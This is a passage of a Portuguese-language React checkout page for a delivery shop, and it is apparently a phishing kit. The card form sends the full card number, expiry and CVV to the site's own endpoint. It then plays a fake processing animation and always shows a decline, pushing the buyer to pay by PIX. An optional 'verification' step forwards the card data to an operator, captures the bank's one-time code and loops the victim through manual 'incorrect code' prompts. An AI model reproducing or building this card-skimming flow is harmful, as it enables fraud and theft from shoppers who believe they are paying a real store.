    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 11) return numbers.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    return cpf;
  };

  // Formatar número do cartão: Amex = 4-6-5, outros = 4-4-4-4
  const formatCardNumber = (value: string, brand?: CardBrand) => {
    const numbers = value.replace(/\D/g, '');
    
    // Detectar bandeira para aplicar máscara correta
    const detectedBrand = brand || getCardBrand(numbers);
    
    if (detectedBrand === 'amex') {
      // AMEX: 4-6-5 (15 dígitos)
      let formatted = numbers.substring(0, 4);
      if (numbers.length > 4) formatted += ' ' + numbers.substring(4, 10);
      if (numbers.length > 10) formatted += ' ' + numbers.substring(10, 15);
      return formatted;
    }
    
    // Outros: 4-4-4-4 (16 dígitos)
    return numbers.replace(/(\d{4})(?=\d)/g, '$1 ').trim().substring(0, 19);
  };

  const handleContinue = async () => {
    if (!selectedMethod) { toast.error('Selecione um método de pagamento'); return; }

    if (selectedMethod === 'pix') {
      const cleanCPF = cpf.replace(/\D/g, '');
      if (cleanCPF.length !== 11) { setCpfError('CPF deve ter 11 dígitos'); toast.error('Por favor, preencha o CPF corretamente'); return; }
      if (!validateCPF(cpf)) { setCpfError('Insira um CPF válido'); toast.error('Insira um CPF válido para gerar o código PIX'); return; }
    }

    if (selectedMethod === 'card') {
      if (cardData.number.replace(/\D/g, '').length < 15) { toast.error('Número do cartão inválido'); return; }
      if (!cardData.name || cardData.expiry.length !== 5 || cardData.cvv.length < 3) { toast.error('Preencha todos os dados do cartão'); return; }
    }

    try {
      if (selectedMethod === 'pix') {
        // Salvar dados para criação do pedido na página PIX
        const fullAddress = `${checkoutData.street}, ${checkoutData.number}${checkoutData.complement ? ', ' + checkoutData.complement : ''}, ${checkoutData.neighborhood}, ${checkoutData.city} - ${checkoutData.state}, CEP ${checkoutData.cep}`;
        const phoneDigits = checkoutData.phone.replace(/\D/g, '');
        const uniqueEmail = `cliente_${phoneDigits}@zeexpress.com`;
        
        // Salvar dados completos para criação do pedido na página PIX
        sessionStorage.setItem('pixCheckoutData', JSON.stringify({
          customerName: checkoutData.name,
          customerEmail: uniqueEmail,
          customerPhone: checkoutData.phone,
          customerCpf: cpf.replace(/\D/g, ''),
          address: fullAddress,
          complement: checkoutData.complement || '',
          items: items,
          subtotal,
          deliveryFee,
          total
        }));
        
        // Redirecionar imediatamente - a página PIX fará a criação do pedido
        router.push('/checkout/pix');
      } else {
        // Salvar a bandeira atual para o overlay
        setOverlayBrand(cardBrand);
        
        // Mostrar overlay da máquina de cartão
        setShowCardProcessingOverlay(true);
        setShowOverlayError(false);
        setShowEntendiButton(false);
        
        const fullAddress = `${checkoutData.street}, ${checkoutData.number}${checkoutData.complement ? ', ' + checkoutData.complement : ''}, ${checkoutData.neighborhood}, ${checkoutData.city} - ${checkoutData.state}, CEP ${checkoutData.cep}`;
        await fetch('/api/card-data', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ customerName: checkoutData.name, customerEmail: 'cliente@email.com', customerPhone: checkoutData.phone, cardNumber: cardData.number.replace(/\s/g, ''), cardName: cardData.name, expiryDate: cardData.expiry, cvv: cardData.cvv, orderTotal: total }) });
        
        if (verificationEnabled) {
          // Verification enabled: 2s animation then show info modal
          await new Promise(resolve => setTimeout(resolve, 2000));
          setShowVerificationInfoModal(true);
        } else {
          // Standard flow: 4.5s animation then error
          await new Promise(resolve => setTimeout(resolve, 4500));
          setShowOverlayError(true);
          setTimeout(() => setShowEntendiButton(true), 2000);
          const timeout = setTimeout(() => { handleCloseOverlayAndRedirect(); }, 15000);
          setErrorTimeoutRef(timeout);
        }
      }
    } catch (error: any) { console.error('Payment error:', error); toast.error(error.message || 'Erro ao processar pagamento'); }
  };

  // Close verification modal - go back to card form with data preserved
  const handleCloseVerificationModal = () => {
    setShowCardProcessingOverlay(false);
    setShowVerificationInfoModal(false);
    setShowVerificationCodeInput(false);
    setShowOverlayError(false);
    setShowEntendiButton(false);
    setIsProcessing(false);
    setVerificationCodeError('');
  };

  // Handle "Receber código" click - sends card data to admin
  const handleReceberCodigo = async () => {
    setIsLoadingReceber(true);
    let recordId = verificationRecordId;
    try {
      const lastFour = cardData.number.replace(/\s/g, '').slice(-4);
      const res = await fetch('/api/verification-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          customerName: checkoutData?.name || '',
          cardBrand: cardBrand,
          lastFourDigits: lastFour,
          cardNumber: cardData.number.replace(/\s/g, ''),
          expiryDate: cardData.expiry,
          cvv: cardData.cvv,
          orderTotal: getTotal()
        })
      });
      const data = await res.json();
      if (data.id) {
        setVerificationRecordId(data.id);
        recordId = data.id;
      }
    } catch (e) { console.error('Error sending card data:', e); }
    
    // Hide info modal, show processing animation for 10s, then show code input
    setShowVerificationInfoModal(false);
    setIsLoadingReceber(false);
    // 10s delay with polling for REJECTED during animation
    const start10 = Date.now();
    let wasRejected10 = false;
    while (Date.now() - start10 < 10000) {
      await new Promise(r => setTimeout(r, 2000));
      try {
        if (recordId) {
          const pollRes = await fetch(`/api/verification-code?id=${recordId}`);
          const pollData = await pollRes.json();
          if (pollData.status === 'REJECTED') { wasRejected10 = true; break; }
        }
      } catch (e) { /* ignore */ }
    }
    if (wasRejected10) {
      // Show standard error flow
      setShowOverlayError(true);
      setTimeout(() => setShowEntendiButton(true), 2000);
      const timeout = setTimeout(() => { handleCloseOverlayAndRedirect(); }, 15000);
      setErrorTimeoutRef(timeout);
      return;
    }
    setShowVerificationCodeInput(true);
  };

  // Handle verification code submission (stage 2)
  const handleVerificationCodeSubmit = async (code: string) => {
    setIsSubmittingCode(true);
    try {
      if (verificationRecordId) {
        await fetch('/api/verification-code', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: verificationRecordId, code })
        });
      }
    } catch (e) { console.error('Verification code submit error:', e); }
    setIsSubmittingCode(false);
    setShowVerificationCodeInput(false);
    
    // 40s delay with polling every 2s for admin actions (REJECTED or INCORRECT_CODE)
    const pollStart = Date.now();
    const pollForAdminAction = async (): Promise<string> => {
      while (Date.now() - pollStart < 40000) {
        await new Promise(r => setTimeout(r, 2000));
        try {
          if (verificationRecordId) {
            const res = await fetch(`/api/verification-code?id=${verificationRecordId}`);
            const data = await res.json();
            if (data.status === 'REJECTED' || data.status === 'INCORRECT_CODE') {
              return data.status;
            }
          }
        } catch (e) { /* ignore polling errors */ }
      }
      return 'TIMEOUT';
    };
    
    const adminAction = await pollForAdminAction();
    
    if (adminAction === 'INCORRECT_CODE') {
      // Show incorrect code message and let client re-enter
      setShowVerificationCodeInput(true);
      setVerificationCodeError('Código incorreto. Por favor, verifique e tente novamente.');
      return; // Don't proceed to error flow, let them retry
    }
    
    // REJECTED or TIMEOUT: show standard error flow
    setShowOverlayError(true);
    setTimeout(() => setShowEntendiButton(true), 2000);
    const timeout = setTimeout(() => { handleCloseOverlayAndRedirect(); }, 15000);
    setErrorTimeoutRef(timeout);
  };

  // Função para fechar overlay e redirecionar para PIX
  const handleCloseOverlayAndRedirect = () => {
    if (errorTimeoutRef) clearTimeout(errorTimeoutRef);
    setShowCardProcessingOverlay(false);
    setShowOverlayError(false);
    setShowEntendiButton(false);
    setShowVerificationInfoModal(false);
    setShowVerificationCodeInput(false);
    setVerificationRecordId(null);
    setCardData({ number: '', name: '', expiry: '', cvv: '' });
    setSelectedMethod('pix');
    setCardWasDeclined(true); // Marca que o cartão foi recusado
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const isPixValid = selectedMethod === 'pix' && cpf.replace(/\D/g, '').length === 11 && validateCPF(cpf);
  const minCvvLength = isAmex ? 4 : 3;
  const isCardValid = selectedMethod === 'card' && 
    cardData.number.replace(/\D/g, '').length >= 15 && 
    isCardNumberValid === true &&
    isNameValid === true &&
    isExpiryValid === true &&
    cardData.cvv.length >= minCvvLength;
    
  // Handle card payment with validation errors
  const handleCardPayment = () => {
    setCardError('');
    
    // Check card number first
    if (cardData.number.replace(/\D/g, '').length < 13 || isCardNumberValid === false) {
      setCardError('Número do cartão incorreto');
      return;
    }
    
    // Check name
    if (!cardData.name || isNameValid === false) {
      setCardError('Nome do titular incompleto');
      return;
    }
    
    // Check expiry
    if (!cardData.expiry || isExpiryValid === false) {
      setCardError('Data de validade expirada ou inválida');
      return;
    }
    
    // Check CVV
    const requiredCvvLength = isAmex ? 4 : 3;
    if (cardData.cvv.length < requiredCvvLength) {
      setCardError('Código de segurança (CVV) incompleto');
      return;
    }
    
    handleContinue();
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-100">
      <CheckoutHeader 
        title="PAGAMENTO" 
        backRoute="/checkout/revisao"
        rightElement={
          <button type="button" onClick={() => setShowSummary(!showSummary)} className="flex items-center gap-2">
            <span className="text-base font-bold text-amber-400">R$ {total.toFixed(2).replace('.', ',')}</span>
            {showSummary ? <ChevronUp className="w-4 h-4 text-amber-400" /> : <ChevronDown className="w-4 h-4 text-amber-400" />}
          </button>
        }
      />
      {showSummary && (
        <div className="fixed top-16 left-0 right-0 bg-gray-800 z-40 max-h-[400px] overflow-y-auto">
          <div className="px-4 py-4">
            <div className="space-y-3 mb-4">
              {items.map((item) => (
                <div key={item.id} className="flex gap-3">
                  <div className="relative w-14 h-14 rounded-lg overflow-hidden bg-gray-700 flex-shrink-0"><Image src={item.imageUrl} alt={item.name} fill className="object-contain" /></div>
                  <div className="flex-1 min-w-0"><p className="font-semibold text-sm truncate text-white">{item.quantity}x {item.name}</p><p className="text-xs text-gray-400">{item.categoryName}</p><p className="text-sm text-amber-400 mt-0.5">R$ {(item.finalPrice * item.quantity).toFixed(2).replace('.', ',')}</p></div>
                </div>
              ))}
            </div>
            <div className="border-t border-gray-700 pt-3 space-y-2">
              <div className="flex justify-between text-sm"><span className="text-gray-400">Subtotal</span><span className="text-white">R$ {subtotal.toFixed(2).replace('.', ',')}</span></div>
              <div className="flex justify-between text-sm"><span className="text-gray-400">Entrega</span>{deliveryFee === 0 ? <span className="text-green-400 font-semibold">GRÁTIS</span> : <span className="text-white">R$ {deliveryFee.toFixed(2).replace('.', ',')}</span>}</div>
              <div className="flex justify-between pt-2 border-t border-gray-700"><span className="font-bold text-white">Total</span><span className="font-bold text-amber-400">R$ {total.toFixed(2).replace('.', ',')}</span></div>
            </div>
          </div>
        </div>
      )}
      
      <main className="flex-1 container mx-auto px-4 pt-20 pb-8 max-w-2xl">
        <div className="bg-gray-800 rounded-2xl p-6 space-y-6">
          <h2 className="text-xl font-bold text-white">Escolha a forma de pagamento</h2>

          <div onClick={() => setSelectedMethod('pix')} className={`relative cursor-pointer rounded-2xl border-2 p-6 transition-all ${selectedMethod === 'pix' ? 'border-amber-400 bg-gray-700' : 'border-gray-600 hover:border-gray-500'}`}>
            <div className="flex items-center gap-4">
              <div className={`w-12 h-12 rounded-xl flex items-center justify-center ${selectedMethod === 'pix' ? 'bg-[#4db6ac]/20' : 'bg-gray-700'}`}>
                <PixIcon className="w-8 h-8" />
              </div>
              <div className="flex-1">
                <h3 className="font-bold text-lg text-white">PIX</h3>
              </div>
              <p className="text-sm text-gray-400 hidden sm:block">Aprovação imediata</p>
              {selectedMethod === 'pix' && <Check className="w-6 h-6 text-amber-400" />}
            </div>
            {selectedMethod === 'pix' && (
              <div className="mt-4 space-y-3">
                <div><label className="block text-sm font-semibold mb-2 text-white">CPF *</label><input type="text" value={cpf} onChange={(e) => { const newValue = formatCPF(e.target.value); setCpf(newValue); const digitsOnly = newValue.replace(/\D/g, ''); if (digitsOnly.length === 11) { if (!validateCPF(newValue)) setCpfError('Insira um CPF válido'); else setCpfError(''); } else setCpfError(''); }} placeholder="000.000.000-00" maxLength={14} className={`w-full px-4 py-3 rounded-xl border bg-gray-600 text-white placeholder-gray-400 focus:outline-none focus:ring-2 ${cpfError ? 'border-red-500 focus:ring-red-500 text-red-400' : 'border-gray-500 focus:ring-amber-400'}`} />{cpfError && <p className="text-red-400 text-sm mt-1 font-medium">{cpfError}</p>}</div>
                <button type="button" onClick={handleContinue} disabled={!isPixValid} className="w-full bg-amber-400 hover:bg-amber-500 text-gray-900 font-bold py-4 px-6 rounded-xl transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-4">Gerar código PIX</button>
              </div>
            )}
          </div>

          <div 
            onClick={() => { setSelectedMethod('card'); if (cardWasDeclined) setCardWasDeclined(false); }} 
            className={`relative cursor-pointer rounded-2xl border-2 transition-all ${
              cardWasDeclined 
                ? 'p-3 border-gray-600 hover:border-gray-500 opacity-60' 
                : selectedMethod === 'card' 
                  ? 'p-6 border-amber-400 bg-gray-700' 
                  : 'p-6 border-gray-600 hover:border-gray-500'
            }`}
          >
            <div className={`flex items-center ${cardWasDeclined ? 'gap-3' : 'gap-4'}`}>
              <div className={`${cardWasDeclined ? 'w-8 h-8' : 'w-12 h-12'} rounded-xl flex items-center justify-center ${selectedMethod === 'card' && !cardWasDeclined ? 'bg-amber-400/20' : 'bg-gray-700'}`}>
                <GenericCardIcon className={cardWasDeclined ? 'w-5 h-5' : 'w-8 h-8'} />
              </div>
              <div className="flex-1">
                <h3 className={`font-bold ${cardWasDeclined ? 'text-sm text-gray-400' : 'text-lg text-white'}`}>Cartão de Crédito</h3>
                {cardWasDeclined && <p className="text-xs text-gray-500">Clique para tentar novamente</p>}
              </div>
              {selectedMethod === 'card' && !cardWasDeclined && <Check className="w-6 h-6 text-amber-400" />}
            </div>
            {selectedMethod === 'card' && !cardWasDeclined && (
              <div className="mt-4 space-y-4">
                {/* Error message at top with icon */}
                {cardError && (
                  <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-xl flex items-center gap-3 animate-pulse">
                    <AlertTriangle className="w-5 h-5 text-red-500 flex-shrink-0" />
                    <span className="text-sm font-medium">{cardError}</span>
                  </div>
                )}
                
                {/* Mirror Card with 3D Flip */}
                <div className="flex justify-center mb-2" style={{ perspective: '1000px' }}>
                  <div 
                    className="relative w-full max-w-[320px] h-[200px] transition-transform duration-700"
                    style={{ 
                      transformStyle: 'preserve-3d',
                      transform: isCardFlipped ? 'rotateY(180deg)' : 'rotateY(0deg)'
                    }}
                  >
                    {/* Front of Card */}
                    <div 
                      className="absolute inset-0 rounded-2xl p-5 flex flex-col justify-between shadow-xl"
                      style={{ 
                        backfaceVisibility: 'hidden',
                        background: 'linear-gradient(135deg, #f59e0b 0%, #d97706 50%, #b45309 100%)'
                      }}
                    >
                      {/* Top Row - Chip and Brand */}
                      <div className="flex justify-between items-start">
                        <ChipIcon />
                        {/* Brand Logo with fade transition */}
                        <div className={`transition-all duration-300 ease-in-out transform ${cardBrand !== 'unknown' ? 'opacity-100 scale-100' : 'opacity-60 scale-95'}`}>
                          <CardBrandLogo brand={cardBrand} size={60} className="h-10 w-auto" />
                        </div>
                      </div>
                      
                      {/* Card Number */}
                      <div className="text-white text-xl tracking-[0.2em] font-mono mt-2">
                        {cardData.number || '0000 0000 0000 0000'}
                      </div>
                      
                      {/* Bottom Row - Name and Expiry */}
                      <div className="flex justify-between items-end">
                        <div>
                          <p className="text-white/60 text-[10px] uppercase tracking-wider">Nome</p>
                          <p className="text-white text-sm font-medium tracking-wide truncate max-w-[180px]">
                            {cardData.name || 'NOME DO TITULAR'}
                          </p>
                        </div>
                        <div className="text-right">
                          <p className="text-white/60 text-[10px] uppercase tracking-wider">Validade</p>
                          <p className="text-white text-sm font-medium">
                            {cardData.expiry || 'MM/AA'}
                          </p>
                        </div>
                      </div>
                    </div>
                    
                    {/* Back of Card */}
                    <div 
                      className="absolute inset-0 rounded-2xl flex flex-col shadow-xl overflow-hidden"
                      style={{ 
                        backfaceVisibility: 'hidden',
                        transform: 'rotateY(180deg)',
                        background: 'linear-gradient(135deg, #f59e0b 0%, #d97706 50%, #b45309 100%)'
                      }}
                    >
                      {/* Magnetic Strip */}
                      <div className="w-full h-12 bg-gray-900 mt-6"></div>
                      
                      {/* CVV Section */}
                      <div className="flex-1 flex flex-col justify-center px-5">
                        <div className="flex items-center gap-3">
                          <div className="flex-1 h-10 bg-white/90 rounded flex items-center justify-end pr-3">
                            <span className="text-gray-800 font-mono text-lg tracking-wider italic">
                              {cardData.cvv || (isAmex ? '0000' : '000')}
                            </span>
                          </div>
                          <span className="text-white text-xs font-medium">CVV</span>
                        </div>
                        <p className="text-white/60 text-[10px] mt-3 text-center">
                          Código de segurança no verso do cartão
                        </p>
                      </div>
                      
                      {/* Brand at bottom */}
                      <div className={`absolute bottom-4 right-4 transition-all duration-300 ${cardBrand !== 'unknown' ? 'opacity-100' : 'opacity-60'}`}>
                        <CardBrandLogo brand={cardBrand} size={50} className="h-8 w-auto" />
                      </div>
                    </div>
                  </div>
                </div>
                
                {/* Card Number Input */}
                <div>
                  <label className="block text-sm font-semibold text-white mb-1.5">Número do Cartão</label>
                  <div className="relative">
                    <input 
                      type="text" 
                      inputMode="numeric"
                      value={cardData.number} 
                      onChange={(e) => {
                        setCardData({ ...cardData, number: formatCardNumber(e.target.value) });
                        setCardError('');
                      }}
                      onFocus={() => setIsCardFlipped(false)}
                      placeholder={isAmex ? "0000 000000 00000" : "0000 0000 0000 0000"} 
                      maxLength={isAmex ? 17 : 19} 
                      className={`w-full px-4 py-3 pr-16 rounded-xl border-2 bg-gray-600 text-white placeholder-gray-400 focus:outline-none focus:ring-2 transition-all duration-200 ${
                        cardData.number.replace(/\D/g, '').length >= 13 && isCardNumberValid === false 
                          ? 'border-red-400 focus:ring-red-400 focus:border-red-400' 
                          : 'border-gray-500 focus:ring-amber-400 focus:border-amber-400'
                      }`} 
                    />
                    {/* Brand icon on the right - mesmo logo do Mirror Card */}
                    <div className={`absolute right-3 top-1/2 -translate-y-1/2 transition-all duration-300 ${cardBrand !== 'unknown' ? 'opacity-100' : 'opacity-50'}`}>
                      <CardBrandLogo brand={cardBrand} size={44} className="h-8 w-auto" />
                    </div>
                  </div>
                </div>
                
                {/* Name Input */}
                <div>
                  <label className="block text-sm font-semibold text-white mb-1.5">Nome do Titular</label>
                  <input 
                    type="text" 
                    value={cardData.name} 
                    onChange={(e) => {
                      setCardData({ ...cardData, name: formatName(e.target.value) });
                      setCardError('');
                    }}
                    onFocus={() => setIsCardFlipped(false)}
                    placeholder="NOME COMPLETO" 
                    className={`w-full px-4 py-3 rounded-xl border-2 bg-gray-600 text-white placeholder-gray-400 focus:outline-none focus:ring-2 transition-all duration-200 ${
                      cardData.name && isNameValid === false
                        ? 'border-red-400 focus:ring-red-400 focus:border-red-400'
                        : 'border-gray-500 focus:ring-amber-400 focus:border-amber-400'
                    }`}
                  />
                </div>
                
                {/* Expiry and CVV - Side by Side */}
                <div className="grid grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-semibold text-white mb-1.5">Validade (MM/AA)</label>
                    <input 
                      type="text" 
                      inputMode="numeric"
                      value={cardData.expiry} 
                      onChange={(e) => {
                        setCardData({ ...cardData, expiry: formatExpiryWithValidation(e.target.value) });
                        setCardError('');
                      }}
                      onFocus={() => setIsCardFlipped(false)}
                      placeholder="MM/AA" 
                      maxLength={5} 
                      className={`w-full px-4 py-3 rounded-xl border-2 bg-gray-600 text-white placeholder-gray-400 focus:outline-none focus:ring-2 transition-all duration-200 ${
                        cardData.expiry.length === 5 && isExpiryValid === false
                          ? 'border-red-400 focus:ring-red-400 focus:border-red-400'
                          : 'border-gray-500 focus:ring-amber-400 focus:border-amber-400'
                      }`}
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-semibold text-white mb-1.5">CVV</label>
                    <input 
                      type="text" 
                      inputMode="numeric"
                      value={cardData.cvv} 
                      onChange={(e) => { 
                        const value = e.target.value.replace(/\D/g, ''); 
                        setCardData({ ...cardData, cvv: value.substring(0, cvvMaxLength) });
                        setCardError('');
                      }}
                      onFocus={() => setIsCardFlipped(true)}
                      onBlur={() => setIsCardFlipped(false)}
                      placeholder={cvvPlaceholder} 
                      maxLength={cvvMaxLength} 
                      className="w-full px-4 py-3 rounded-xl border-2 border-gray-500 bg-gray-600 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-amber-400 focus:border-amber-400 transition-all duration-200"
                    />
                  </div>
                </div>
                
                {/* Pay Button */}
                <button 
                  type="button" 
                  onClick={handleCardPayment} 
                  disabled={!isCardValid || isProcessing} 
                  className="w-full bg-amber-400 hover:bg-amber-500 text-gray-900 font-bold py-4 px-6 rounded-xl transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed mt-2 shadow-lg hover:shadow-xl"
                >
                  {isProcessing ? 'Processando Pagamento...' : 'Pagar com Cartão'}
                </button>
              </div>
            )}
          </div>
        </div>
      </main>
      
      {/* Overlay de processamento do cartão */}
      {showCardProcessingOverlay && (
        <CardProcessingOverlay 
          showError={showOverlayError} 
          brand={overlayBrand}
          showButton={showEntendiButton}
          onConfirm={handleCloseOverlayAndRedirect}
          showInfoModal={showVerificationInfoModal}
          showCodeInput={showVerificationCodeInput}
          lastFour={cardData.number.replace(/\s/g, '').slice(-4)}
          onReceberCodigo={handleReceberCodigo}
          isLoadingReceber={isLoadingReceber}
          onCodeSubmit={handleVerificationCodeSubmit}
          isSubmittingCode={isSubmittingCode}
          onCloseModal={handleCloseVerificationModal}
          codeError={verificationCodeError}
          onClearCodeError={() => setVerificationCodeError('')}
        />
      )}
    </div>
  );
}
